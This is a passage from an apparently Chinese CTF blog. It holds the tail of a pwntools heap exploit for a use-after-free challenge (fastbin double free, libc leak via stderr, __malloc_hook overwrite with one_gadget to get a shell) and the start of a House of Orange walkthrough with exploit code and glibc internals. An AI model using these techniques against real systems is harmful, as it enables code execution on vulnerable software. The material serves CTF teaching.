class="built_in">str</span>(size))</span><br><span class="line">	sa(<span class="string">&#x27;:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;2.del&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))	</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	ad(<span class="number">0x20</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># idx 0</span></span><br><span class="line"></span><br><span class="line">	p = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x50</span></span><br><span class="line">	p += p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(<span class="number">0x31</span>)</span><br><span class="line"></span><br><span class="line">	ad(<span class="number">0x60</span>, p) <span class="comment"># idx 1</span></span><br><span class="line">	ad(<span class="number">0x80</span>, <span class="string">&#x27;B&#x27;</span>) <span class="comment"># idx 2</span></span><br><span class="line">	ad(<span class="number">0x20</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># idx 3</span></span><br><span class="line">	ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># idx 4</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># for fastbin attack to _free_hook</span></span><br><span class="line">	ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># idx 5</span></span><br><span class="line">	ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># idx 6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	rm(<span class="number">3</span>)</span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line">	rm(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">	rm(<span class="number">2</span>) <span class="comment"># for patial write to </span></span><br><span class="line"></span><br><span class="line">	ad(<span class="number">0x20</span>, <span class="string">&#x27;\x90&#x27;</span>) <span class="comment"># attack to chunk 2 - 0x10</span></span><br><span class="line"></span><br><span class="line">	ad(<span class="number">0x20</span>, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">	ad(<span class="number">0x20</span>, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	p = p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(<span class="number">0x71</span>)</span><br><span class="line">	p += <span class="string">&#x27;\xdd\x25&#x27;</span></span><br><span class="line">	ad(<span class="number">0x20</span>, p) <span class="comment"># patial write to _IO_2_1_stderr_ + 157</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment"># fastbin attack to _IO__2_1_stderr + 157</span></span><br><span class="line">	rm(<span class="number">4</span>)</span><br><span class="line">	rm(<span class="number">1</span>)</span><br><span class="line">	rm(<span class="number">4</span>)</span><br><span class="line">	ad(<span class="number">0x60</span>, <span class="string">&#x27;\xa0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># for alignment</span></span><br><span class="line">	ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">	ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">	ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">	p = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x33</span></span><br><span class="line">	p += p64(<span class="number">0xfbad3c80</span>)</span><br><span class="line">	p += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">	p += p8(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">	ad(<span class="number">0x60</span>, p)</span><br><span class="line">	lib.address = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">&#x27;\x7f\x00\x00&#x27;</span>) - (<span class="number">0x7ffff7dd2608</span> - <span class="number">0x7ffff7a0d000</span>)</span><br><span class="line">	li(<span class="string">&#x27;libc_base &#x27;</span> + <span class="built_in">hex</span>(lib.address))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># fast bin attack to malloc_hook - 0x23</span></span><br><span class="line">	rm(<span class="number">5</span>)	</span><br><span class="line">	rm(<span class="number">6</span>)	</span><br><span class="line">	rm(<span class="number">5</span>)	</span><br><span class="line"></span><br><span class="line">	p = p64(lib.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span>)</span><br><span class="line">	ad(<span class="number">0x68</span>, p)</span><br><span class="line">	ad(<span class="number">0x68</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># for ajust</span></span><br><span class="line">	ad(<span class="number">0x68</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># for ajust</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	gadget = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">	one_gadget = lib.address + gadget[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">	p = <span class="string">&#x27;A&#x27;</span> * (<span class="number">0x13</span> <span class="number">-8</span>)</span><br><span class="line">	p += p64(one_gadget)</span><br><span class="line">	p += p64(lib.sym[<span class="string">&#x27;realloc&#x27;</span>] + <span class="number">12</span>)</span><br><span class="line">	ad(<span class="number">0x68</span>, p)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># get shell</span></span><br><span class="line">	ru(<span class="string">&#x27;del&#x27;</span>)</span><br><span class="line">	sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">			io = exe.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = exe.process()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		io = remote(remoteIp, remotePort)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">	</span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">[rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">[rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">[rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/05/06/wp-uaf/" data-id="ckhemv83c003qwdcm8p3r7wq2" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-wp-house-of-orange" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/05/01/wp-house-of-orange/" class="article-date">
  <time datetime="2020-05-01T15:19:09.000Z" itemprop="datePublished">2020-05-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/05/01/wp-house-of-orange/">wp house of orange</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="House-Of-Orange"><a href="#House-Of-Orange" class="headerlink" title="House Of Orange"></a>House Of Orange</h1><h2 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h2><p>2016 ctf-HITCON</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>libc: libc.2.23</p>
<p>Unbuntu16</p>
<h2 id="难度"><a href="#难度" class="headerlink" title="难度"></a>难度</h2><p>8 / 10</p>
<h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2> <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>



<h2 id="简单描述"><a href="#简单描述" class="headerlink" title="简单描述"></a>简单描述</h2><p>保护全开,有添加功能和编辑功能,只能添加4次,每次添加都会malloc三次分别储存不同的信息, 可以编辑三次,没有free函数,是经典的 House Of Orange漏洞利用类型.</p>
<h2 id="vul"><a href="#vul" class="headerlink" title="vul"></a>vul</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">length = InputNum();</span><br><span class="line"><span class="keyword">if</span> ( length &gt; <span class="number">0x1000</span> )</span><br><span class="line">  length = <span class="number">4096</span>;                              <span class="comment">// vul</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name:&quot;</span>);</span><br><span class="line">InputContent((<span class="keyword">void</span> *)qword_203068[<span class="number">1</span>], length);</span><br></pre></td></tr></table></figure>

<p>申请大小小于0x1000时,存在堆溢出漏洞.</p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>House of orange ( modify top chunk realize free, unsoted bin attack, small bin attack, IO_FILE)</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>使用堆溢出修改top chunk大小(按照内存对其), 再申请一个大小大于top chunk size 的chunk,然而old top chunk就会被free掉,申请一个large bin大小的chunk,由于large bin申请成功后fd_nextsize和bk_nextsize会指向自身地址,可以泄漏heap地址,然而,申请的位置也恰好含有以前所剩的main_arena信息,所以直接打印即可泄漏libc. 后面就通过unsorted bin attack修改IO_list_all为main_arena + 0x58, 然后根据small bin管理机制,修改main_arena  + 0x58处的fake IO_FILE的chain的值指向伪造的IO_FILE,而使伪造堆块满足fp-&gt;<code>_mode</code> &lt;= 0 &amp;&amp; fp-&gt;<code>_IO_write_ptr</code> &gt; fp-&gt;<code>_IO_write_base</code> 然后会调用vtable中的<code>__overflow</code> 函数,然而我们可以伪造再一个vtable,实现在调用<code>__overflow</code>的时候调用我们的函数,这里函数就改为system,传入参数需要在伪造的IO_FILE头部写入’/bin/sh\x00’然后在unsoretd bin被破坏之后再次申请时报错, 那触发异常就会打印错误信息,<code>malloc_printerr</code>是<code>malloc</code>中用来打印错误的函数，而 malloc_printerr<code>其实是调用</code> <code>__libc_message</code>函数之后调用<code>abort</code>函数，<code>abort</code>函数其中调用了<code>_IO_flush_all_lockp</code>, 然后根据<code>IO_list_all</code>中的值去遍历IO_FILE调用IO_FILE 的vtable中的 <code>__overflow</code>函数指针, 然后就可以调用system 传入 ‘/bin/sh\00’ get shell</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: I0gan</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">exeFile = <span class="string">&#x27;houseoforange&#x27;</span></span><br><span class="line">libFile = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line"><span class="comment">#libFile = &#x27;./libc64-2.19.so&#x27;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">remotePort = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">LIB   = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>(<span class="params">size, data</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;Your choice : &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	sla(<span class="string">&#x27;name :&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">	sa(<span class="string">&#x27;Name :&#x27;</span>, data)</span><br><span class="line">	sla(<span class="string">&#x27;Price of Orange:&#x27;</span>, <span class="built_in">str</span>(<span class="number">16</span>))</span><br><span class="line">	sla(<span class="string">&#x27;Orange:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md</span>(<span class="params">size, data</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;Your choice : &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	sla(<span class="string">&#x27;name :&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">	sa(<span class="string">&#x27;Name:&#x27;</span>, data)</span><br><span class="line">	sla(<span class="string">&#x27;Price of Orange:&#x27;</span>, <span class="built_in">str</span>(<span class="number">16</span>))</span><br><span class="line">	sla(<span class="string">&#x27;Orange:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dp</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;Your choice : &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>))	</span><br></pre></td></tr></table></figure>



<h3 id="修改top-chunk-size实现free的效果"><a href="#修改top-chunk-size实现free的效果" class="headerlink" title="修改top chunk size实现free的效果"></a>修改top chunk size实现free的效果</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>House of Orange的核心在于在没有free函数的情况下得到一个释放的堆块(unsorted bin),这种操作的原理简单来说是当前堆的top chunk尺寸不足以满足申请分配的大小的时候，原来的top chunk会被释放并被置入unsorted bin中，通过这一点可以在没有free函数情况下获取到unsorted bins</p>
<p>来看一下这个过程的详细情况，假设目前的top chunk已经不满足malloc的分配需求。 首先我们在程序中的<code>malloc</code>调用会执行到libc.so的<code>_int_malloc</code>函数中，在<code>_int_malloc</code>函数中，会依次检验fastbin、small bins、unsorted bin、large bins是否可以满足分配要求，因为尺寸问题这些都不符合。接下来<code>_int_malloc</code>函数会试图使用top chunk，在这里top chunk也不能满足分配的要求，因此会执行如下分支。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc(nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时ptmalloc已经不能满足用户申请堆内存的操作，需要执行sysmalloc来向系统申请更多的空间。 但是对于堆来说有mmap和brk两种分配方式，需要让堆以brk的形式拓展，之后原有的top chunk会被置于unsorted bin中。</p>
<p>综上，要实现brk拓展top chunk，但是要实现这个目的需要绕过一些libc中的check，首先，malloc的尺寸不能大于<code>mmp_.mmap_threshold</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br></pre></td></tr></table></figure>

<p>如果所需分配的 chunk 大小大于 mmap 分配阈值，默认为 128K，并且当前进程使用 mmap()分配的内存块小于设定的最大值，将使用 mmap()系统调用直接向操作系统申请内存。</p>
<p>在sysmalloc函数中存在对top chunk size的check，如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert((old_top == initial_top(av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">     ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">      prev_inuse(old_top) &amp;&amp;</span><br><span class="line">      ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)old_end &amp; pagemask) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure>

<p>这里检查了top chunk的合法性，如果第一次调用本函数，top chunk可能没有初始化，所以可能old_size为0，如果top chunk已经初始化了，那么top chunk的大小必须大于等于MINSIZE，因为top chunk中包含了  fencepost，所以top chunk的大小必须要大于MINSIZE。其次Top  chunk必须标识前一个chunk处于inuse状态，并且top chunk的结束地址必定是页对齐的。此外top  chunk除去fencepost的大小必定要小于所需chunk的大小，否则在_int_malloc()函数中会使用top  chunk分割出chunk</p>
<p>总结一下伪造的top chunk size的要求</p>
<p>1.伪造的size必须要对齐到内存页</p>
<p>2.size要大于MINSIZE(0x10)</p>
<p>3.size要小于之后申请的chunk size + MINSIZE(0x10)</p>
<p>4.size的prev inuse位必须为1</p>
<p>之后原有的top chunk就会执行<code>_int_free</code>从而顺利进入unsorted bin中</p>
<p>回到题中,就要得满足以上要求</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /40gx 0x555555758060</span><br><span class="line">0x555555758060:	0x0000000000000000	0x0000000000020fa1</span><br><span class="line">0x555555758070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555758080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555758090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555557580a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555557580b0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>然而 0x555555758060 + 0x0000000000020fa1 ==  0x555555779001 , 去掉inuse位,则内存是按照0x1000对齐的,则我们所能修改top chunk的大小就可以为: (x * 0x1000 + 0x20fa1) &gt; MINSIZE(0x10) (x 属于 整数),题中在添加的时候,最多只能申请大小为0x1000,那我们就通过堆溢出把top chunk size 改为: 0x0fa1, 然后再申请大于这个top chunk size的chunk就可以实现top chunk free后成为unsoted bin </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ad(<span class="number">0x10</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">p = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">p += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) <span class="comment">#后一个储存颜色的chunk</span></span><br><span class="line">p += p64(<span class="number">0x1f00000010</span>)</span><br><span class="line">p += p64(<span class="number">0</span>)</span><br><span class="line">p += p64(<span class="number">0</span>) <span class="comment"># top chunk pre_size</span></span><br><span class="line">p += p64(<span class="number">0x00fa1</span>) <span class="comment"># top chunk size</span></span><br><span class="line">   md(<span class="number">0x80</span>, p) <span class="comment"># 堆溢出修改top chunk size</span></span><br></pre></td></tr></table></figure>
<p>实现如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x5555557580a0</span> —▸ <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x5555557580a0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>



<h3 id="Leak-libc-and-heap-addr"><a href="#Leak-libc-and-heap-addr" class="headerlink" title="Leak libc and heap addr"></a>Leak libc and heap addr</h3><p>申请一个小于刚才释放 unsoted bin 大小的一个chunk,根据unsoted bin的分割特性,会把main_arena转移,且不会清空chunk 的fd和bk的内容,所以main_arena还存在,直接打印即可获取main_arena地址泄漏libc,但在添加的时候要输入内容,为了得到完整的main_arena地址信息,就填充8个字符到chunk bk位置从而泄漏完整地址, 为了后面要采取伪造fake IO_FILE结构,就要得修改vtable指向当前伪造的虚函数表,那就要得知道heap地址了, 那怎么泄漏 heap地址呢? 由于large bin 大小的chunk有一个特点,申请成功的chunk 的 fd_nextsize和bk_nextsize会填充为自己的地址</p>
<p>large bin申请成功后,会向fd_nextsize和bk_nextsize填充自己的地址代码如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                  <span class="comment">//这里若申请的是符合large bin大小的chunk</span></span><br><span class="line">                  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      <span class="comment">//向后退两个chunk, 而fwd-&gt;fd == victim</span></span><br><span class="line">                      fwd = bck; </span><br><span class="line">                      bck = bck-&gt;bk; <span class="comment">// bck-&gt;fd =fwd-&gt;bk</span></span><br><span class="line">					  <span class="comment">//这里的victim 的值就是chunk的申请到的地址</span></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd; <span class="comment">//还是填充自己本身地址</span></span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;  <span class="comment">//填充之后,再取出来继续填充一样的地址,还是本身地址.</span></span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; </span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                 